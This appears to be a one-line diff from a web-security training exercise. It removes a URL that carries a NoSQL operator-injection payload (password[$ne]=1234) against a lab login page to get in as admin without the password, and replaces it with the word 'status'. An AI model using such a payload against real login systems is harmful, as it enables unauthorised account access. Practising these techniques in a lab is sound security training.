@@ -1,1 +1,1 @@
-http://web0x01.hbtn/a3/sql_injection/?username=admin&password[$ne]=1234
+status
